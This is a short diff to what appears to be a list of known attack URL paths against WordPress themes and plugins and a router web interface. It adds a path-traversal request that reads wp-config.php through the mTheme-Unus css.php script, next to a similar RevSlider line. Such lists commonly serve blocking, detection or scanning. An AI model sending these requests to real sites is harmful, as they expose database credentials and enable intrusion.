@@ -35,3 +35,4 @@
 /blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
 /cgibin/webproc
 /wp-content/themes/mTheme-Unus/style.css
+/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
